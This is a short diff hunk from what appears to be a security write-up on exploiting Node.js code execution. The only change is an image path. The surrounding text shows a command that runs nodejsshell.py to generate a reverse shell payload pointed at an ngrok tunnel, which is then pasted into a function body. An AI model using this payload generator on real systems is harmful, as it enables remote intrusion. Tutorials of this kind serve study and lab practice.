@@ -53,7 +53,7 @@ Now, we can execute a reverse shell payload within the function that would be fi
 
 In my case: `python nodejsshell.py 2.tcp.ngrok.io 13755` allowed me to generate a reverse shell payload for my ngrok tunnel.
 
-![](<../../.gitbook/assets/image (2).png>)
+![](<../../.gitbook/assets/image (2) (1).png>)
 
 Then, we can copy the output into the function body.
 
